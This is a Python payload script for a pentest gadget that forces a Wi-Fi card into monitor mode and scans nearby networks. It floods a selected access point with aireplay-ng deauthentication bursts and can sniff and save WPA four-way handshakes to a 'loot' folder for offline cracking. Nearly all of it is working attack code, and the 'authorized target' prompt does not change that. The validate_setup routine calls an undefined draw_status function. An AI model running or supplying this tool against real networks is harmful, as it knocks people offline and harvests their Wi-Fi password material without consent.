#!/usr/bin/env python3
# @active: true
# @web: true
# @name: WiFi Deauth
# @desc: Select an authorized Wi-Fi target, transmit bounded deauthentication frames, and optionally capture WPA handshake traffic to loot.
# @category: wifi
# @danger: true
# @inputs: [{"name":"seconds","label":"Run duration","type":"number","default":"30"},{"name":"capture","label":"Capture WPA handshakes","type":"select","choices":["false","true"],"default":"false"}]

import os
import sys
import time
import signal
import subprocess
import threading

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces, supports_monitor
from payloads._web_input import request_input

# Optional scapy for handshake capture mode
try:
    from scapy.all import (
        Dot11, Dot11Deauth, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# WiFi integration (optional)
try:
    from wifi.raspyjack_integration import (
        get_best_interface,
        get_available_interfaces,
        get_interface_status,
        set_raspyjack_interface,
    )
    WIFI_INTEGRATION = True
except ImportError:
    WIFI_INTEGRATION = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
SCAN_TIMEOUT_DEFAULT = 15
LOG_FILE = os.path.join(os.environ["CITYPOP_LOOT"], "deauth_debug.log")
LOOT_DIR = os.path.join(os.environ["CITYPOP_LOOT"], "Handshakes")

# Attack modes
MODE_DEAUTH = 0
MODE_DEAUTH_CAPTURE = 1
MODE_LABELS = ["DTH", "DTH+CAP"]

# Colors (base-128 drawing)
CLR_GREEN = "#00FF00"
CLR_RED = "#FF3333"
CLR_YELLOW = "#FFCC00"
CLR_CYAN = "#00CCFF"
CLR_WHITE = "#FFFFFF"
CLR_GRAY = "#888888"
CLR_DARK = "#111111"
CLR_BG_IDLE = "#333300"
CLR_BG_SCAN = "#003300"
CLR_BG_ATK = "#330000"

# ---------------------------------------------------------------------------
# Onboard WiFi detection (keep WebUI alive)
# ---------------------------------------------------------------------------

def _is_onboard_wifi_iface(iface):
    """True for onboard Pi WiFi (SDIO/mmc path or brcmfmac driver)."""
    try:
        devpath = os.path.realpath(f"/sys/class/net/{iface}/device")
        if "mmc" in devpath:
            return True
    except Exception:
        pass
    try:
        driver = os.path.basename(
            os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        )
        if driver == "brcmfmac":
            return True
    except Exception:
        pass
    return False


def _detect_webui_interface():
    """Detect the onboard WebUI WiFi interface name at runtime."""
    try:
        for name in os.listdir("/sys/class/net"):
            if not name.startswith("wlan"):
                continue
            if not os.path.isdir(f"/sys/class/net/{name}/wireless"):
                continue
            if _is_onboard_wifi_iface(name):
                return name
    except Exception:
        pass
    return "wlan0"


WEBUI_INTERFACE = _detect_webui_interface()

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

def log(message):
    """Append timestamped message to log file."""
    ts = time.strftime("%H:%M:%S")
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"[{ts}] {message}\n")
    except Exception:
        pass

# ---------------------------------------------------------------------------
# Legacy interface fallback
# ---------------------------------------------------------------------------

def _get_wifi_interface_fallback():
    """Return best WiFi interface when select_interface returns None."""
    if WIFI_INTEGRATION:
        try:
            interfaces = get_available_interfaces()
            candidates = [
                i for i in interfaces
                if i.startswith("wlan") and i != WEBUI_INTERFACE
            ]
            if candidates:
                candidates.sort(key=lambda x: (int(x[4:]) if x[4:].isdigit() else 999, x))
                return candidates[0]
        except Exception:
            pass
    return "wlan1"

# ---------------------------------------------------------------------------
# Shell helpers
# ---------------------------------------------------------------------------

def run_command(cmd, timeout=None):
    """Run shell command, return combined stdout+stderr."""
    try:
        proc = subprocess.Popen(
            cmd, shell=True,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            preexec_fn=os.setsid,
        )
        stdout, stderr = proc.communicate(timeout=timeout)
        return stdout.decode("utf-8", errors="replace") + stderr.decode("utf-8", errors="replace")
    except Exception:
        return "Error"

# ---------------------------------------------------------------------------
# Monitor mode setup / teardown (preserved from original)
# ---------------------------------------------------------------------------

def check_interface_exists(iface):
    """Return True if the WiFi interface exists."""
    result = run_command(f"iw dev {iface} info")
    if "Interface" in result:
        return True
    # Fallback to ip link
    result = run_command(f"ip link show {iface} 2>/dev/null")
    if iface in result and "does not exist" not in result:
        return True
    return False


def setup_monitor_mode(iface):
    """Enable monitor mode on *iface*. Returns (success, mon_iface_name)."""
    log(f"Setting up monitor mode on {iface}")

    # Unmanage from NetworkManager, kill wpa_supplicant for this iface only
    run_command(f"nmcli device set {iface} managed no")
    run_command(f"pkill -f 'wpa_supplicant.*{iface}'")
    time.sleep(1)

    # Already in monitor?
    iw_info = run_command(f"iw dev {iface} info")
    if "type monitor" in iw_info:
        log(f"{iface} already in monitor mode")
        return True, iface

    # Method 1: manual iw (works with Nexmon and most drivers)
    log("Trying iw")
    run_command(f"ip link set {iface} down")
    time.sleep(0.5)
    run_command(f"iw dev {iface} set type monitor")
    time.sleep(0.5)
    run_command(f"ip link set {iface} up")
    time.sleep(1)
    chk = run_command(f"iw dev {iface} info")
    if "type monitor" in chk:
        log(f"Monitor mode on {iface} via iw")
        return True, iface

    # Method 2: airmon-ng fallback
    log("Trying airmon-ng")
    run_command(f"airmon-ng start {iface}")
    for candidate in [f"{iface}mon", iface]:
        chk = run_command(f"iw dev {candidate} info")
        if "type monitor" in chk:
            log(f"Monitor mode on {candidate} via airmon-ng")
            return True, candidate

    log("Failed to enable monitor mode")
    return False, iface


def validate_setup(iface):
    """Full pre-flight: interface exists, tools present, monitor mode."""
    if not check_interface_exists(iface):
        draw_status(f"{iface} not found!", CLR_RED)
        time.sleep(2)
        return False, iface

    for tool in ("aireplay-ng", "airodump-ng"):
        if tool not in run_command(f"which {tool}"):
            draw_status(f"Missing: {tool}", CLR_RED)
            time.sleep(2)
            return False, iface

    # Check monitor mode capability
    if not supports_monitor(iface):
        draw_status(f"{iface} no monitor mode!\nNeed compatible card", CLR_RED)
        time.sleep(3)
        return False, iface

    draw_status(f"Monitor mode: {iface}...")
    ok, mon = setup_monitor_mode(iface)
    if not ok:
        draw_status(f"Monitor mode failed\non {iface}", CLR_RED)
        time.sleep(2)
    return ok, mon

# ---------------------------------------------------------------------------
# Scanning
# ---------------------------------------------------------------------------

def scan_networks(iface, timeout_sec):
    """Run airodump-ng and parse CSV. Returns list of network dicts."""
    log(f"Scanning on {iface}, timeout {timeout_sec}s")
    subprocess.run("rm -f /tmp/deauth_scan*", shell=True)
    cmd = (
        f"timeout {timeout_sec} airodump-ng --band abg "
        f"--output-format csv -w /tmp/deauth_scan {iface}"
    )
    subprocess.run(cmd, shell=True, capture_output=True, text=True)

    nets = []
    clients_per_bssid = {}

    try:
        with open("/tmp/deauth_scan-01.csv", "r") as f:
            content = f.read()
    except Exception as exc:
        log(f"Cannot read scan CSV: {exc}")
        return nets

    # Split AP section from Station section
    parts = content.split("Station MAC")
    ap_section = parts[0]
    station_section = parts[1] if len(parts) > 1 else ""

    # Count clients per BSSID from station section
    for line in station_section.strip().split("\n"):
        cols = line.split(",")
        if len(cols) >= 6:
            bssid = cols[5].strip() if len(cols) > 5 else ""
            if ":" in bssid:
                clients_per_bssid[bssid] = clients_per_bssid.get(bssid, 0) + 1

    # Parse AP section
    header_found = False
    col_map = {}
    for line in ap_section.strip().split("\n"):
        if "BSSID" in line and "ESSID" in line:
            headers = [h.strip() for h in line.split(",")]
            for i, h in enumerate(headers):
                col_map[h.upper()] = i
            header_found = True
            continue
        if not header_found:
            continue

        cols = line.split(",")
        bssid_i = col_map.get("BSSID", -1)
        essid_i = col_map.get("ESSID", -1)
        ch_i = col_map.get("CHANNEL", -1)
        pwr_i = col_map.get("POWER", -1)

        if bssid_i < 0 or essid_i < 0:
            continue
        if len(cols) <= essid_i:
            continue

        bssid = cols[bssid_i].strip()
        # ESSID is last column and may contain commas — rejoin everything from essid_i
        essid = ",".join(cols[essid_i:]).strip().strip('"')
        # Remove trailing "Key" column if present
        if essid.endswith(","):
            essid = essid[:-1].strip()
        channel = cols[ch_i].strip() if ch_i >= 0 and ch_i < len(cols) else "?"
        power_raw = cols[pwr_i].strip() if pwr_i >= 0 and pwr_i < len(cols) else "-99"

        if not essid or not bssid or ":" not in bssid:
            continue

        # Parse power to int
        try:
            power = int(power_raw)
        except ValueError:
            power = -99

        num_clients = clients_per_bssid.get(bssid, 0)

        nets.append({
            "essid": essid,
            "bssid": bssid,
            "channel": channel,
            "power": power,
            "clients": num_clients,
        })

    # Sort by signal strength (strongest first)
    nets.sort(key=lambda n: n["power"], reverse=True)
    log(f"Found {len(nets)} networks")
    return nets

# ---------------------------------------------------------------------------
# Signal strength helpers
# ---------------------------------------------------------------------------

def _signal_bars(power_dbm):
    """Return 1-4 bar string based on dBm value."""
    if power_dbm >= -50:
        return "||||"
    if power_dbm >= -60:
        return "||| "
    if power_dbm >= -70:
        return "||  "
    if power_dbm >= -80:
        return "|   "
    return ".   "


def _signal_color(power_dbm):
    """Return color for signal strength."""
    if power_dbm >= -50:
        return CLR_GREEN
    if power_dbm >= -65:
        return CLR_YELLOW
    return CLR_RED

# ---------------------------------------------------------------------------
# Attack logic (preserved from original)
# ---------------------------------------------------------------------------

def start_attack_worker(targets, iface, stop_event, stats):
    """Worker thread: aggressive triple deauth on all targets.

    *stats* is a dict mutated in-place: {packets, clients, eapol, hs_captured, hs_ssid}.
    """
    log(f"Attack worker started, {len(targets)} targets")

    # Adaptive timing: more targets = less time per target
    n = len(targets)
    burst_pkts = 16 if n > 3 else 32 if n > 1 else 64
    burst_count = max(1, 3 // n) if n > 0 else 3
    cycle_pause = max(0.5, 2 - n * 0.5)

    while not stop_event.is_set():
        for target in targets:
            if stop_event.is_set():
                break
            ch = target["channel"]
            if ch == "?" or not ch.strip().isdigit():
                continue

            bssid = target["bssid"]

            # Set channel (with timeout to avoid hang)
            run_command(f"iw dev {iface} set channel {ch}", timeout=3)
            time.sleep(0.2)
            if stop_event.is_set():
                break

            # Quick burst deauth per target (strict timeout to avoid blocking)
            for burst in range(burst_count):
                if stop_event.is_set():
                    break
                cmd = f"timeout 5 aireplay-ng -0 {burst_pkts} -a {bssid} {iface}"
                result = run_command(cmd, timeout=8)
                if "Error" not in result:
                    stats["packets"] += burst_pkts
                time.sleep(0.1)

            if stop_event.is_set():
                break

            # Minimal pause between targets
            if stop_event.wait(0.3):
                break

        # Brief pause between full cycles
        if stop_event.wait(cycle_pause):
            break

    log("Attack worker stopped")


def start_capture_worker(targets, iface, stop_event, stats):
    """Worker thread: sniff EAPOL frames in parallel with deauth.

    When 4+ EAPOL messages captured for a MAC pair, save pcap.
    Mutates *stats* in-place.
    """
    if not SCAPY_OK:
        log("Scapy not available -- capture worker disabled")
        return

    eapol_msgs = {}   # (mac_a, mac_b) -> [pkt, ...]
    beacons = {}      # bssid -> beacon pkt (one per AP)
    target_bssids = {t["bssid"].upper() for t in targets}

    def _handle(pkt):
        if stop_event.is_set():
            return
        if not pkt.haslayer(Dot11):
            return

        # Capture beacon frames from target APs (needed by aircrack for ESSID)
        if pkt.type == 0 and pkt.subtype == 8:  # Beacon
            bssid = (pkt[Dot11].addr3 or "").upper()
            if bssid in target_bssids and bssid not in beacons:
                beacons[bssid] = pkt

        if not pkt.haslayer(EAPOL):
            return
        stats["eapol"] += 1
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))
        if pair not in eapol_msgs:
            eapol_msgs[pair] = []
        eapol_msgs[pair].append(pkt)

        # Check for complete handshake
        if len(eapol_msgs[pair]) >= 4 and not stats.get("_saved_" + str(pair)):
            stats["_saved_" + str(pair)] = True
            stats["hs_captured"] += 1
            essid = "unknown"
            # Determine SSID from targets
            for t in targets:
                if t["bssid"].upper() in pair:
                    essid = t["essid"]
                    break
            stats["hs_ssid"] = essid
            # Include beacon in saved pcap so aircrack can read the ESSID
            save_pkts = []
            for bssid in pair:
                if bssid in beacons:
                    save_pkts.append(beacons[bssid])
            save_pkts.extend(eapol_msgs[pair])
            _save_handshake(save_pkts, essid)

    def _sniff_loop():
        while not stop_event.is_set():
            try:
                scapy_sniff(
                    iface=iface, prn=_handle, timeout=10, store=False,
                    stop_filter=lambda _: stop_event.is_set(),
                )
            except Exception as exc:
                log(f"Sniffer error: {exc}")
                if not stop_event.is_set():
                    time.sleep(1)

    sniff_t = threading.Thread(target=_sniff_loop, daemon=True)
    sniff_t.start()
    log("Capture worker started")


def _save_handshake(packets, essid):
    """Write EAPOL packets to a .pcap in loot directory."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    safe = "".join(c if c.isalnum() or c in "-_" else "_" for c in essid)
    ts = time.strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"hs_{safe}_{ts}.pcap")
    try:
        wrpcap(path, packets)
        log(f"Handshake saved: {path}")
    except Exception as exc:
        log(f"Failed to save handshake: {exc}")

# ---------------------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------------------

def stop_all(stop_event, threads, iface):
    """Signal stop, kill leftover processes, wait for threads."""
    stop_event.set()
    run_command("pkill -f aireplay-ng 2>/dev/null || true")
    run_command("pkill -f airodump-ng 2>/dev/null || true")
    for t in threads:
        if t.is_alive():
            t.join(timeout=3)
    run_command(f"nmcli device set {iface} managed yes 2>/dev/null || true")
    log("Cleanup done")



def main():
    choices=[{"value":x["name"],"label":x["name"]} for x in list_interfaces("wifi") if x.get("supports_monitor")]
    if not choices: print("No monitor-capable Wi-Fi interface found",flush=True); return 1
    iface=str(request_input("Select Wi-Fi interface",input_type="select",choices=choices))
    duration=min(600,max(5,int(sys.argv[1]) if len(sys.argv)>1 else 30)); capture=(sys.argv[2].lower()=="true") if len(sys.argv)>2 else False
    ok,iface=validate_setup(iface)
    if not ok: print("Failed to enable monitor mode",flush=True); return 1
    nets=scan_networks(iface,min(60,duration))
    if not nets: print("No access points found",flush=True); return 0
    opts=[{"value":str(i),"label":f"{n.get('essid') or '<hidden>'} · {n.get('bssid')}"} for i,n in enumerate(nets)]
    target=nets[int(request_input("Select authorized target",input_type="select",choices=opts))]
    stop=threading.Event(); stats={"packets":0,"clients":1,"eapol":0,"hs_captured":0,"hs_ssid":""}; threads=[]
    try:
        t=threading.Thread(target=start_attack_worker,args=([target],iface,stop,stats),daemon=True); t.start(); threads.append(t)
        if capture:
            t=threading.Thread(target=start_capture_worker,args=([target],iface,stop,stats),daemon=True); t.start(); threads.append(t)
        print(f"Running bounded deauthentication test for {duration}s",flush=True); end=time.time()+duration
        while time.time()<end: print(f"packets={stats['packets']} eapol={stats['eapol']} handshakes={stats['hs_captured']}",flush=True); time.sleep(2)
        return 0
    finally: stop_all(stop,threads,iface)

if __name__ == "__main__": raise SystemExit(main())
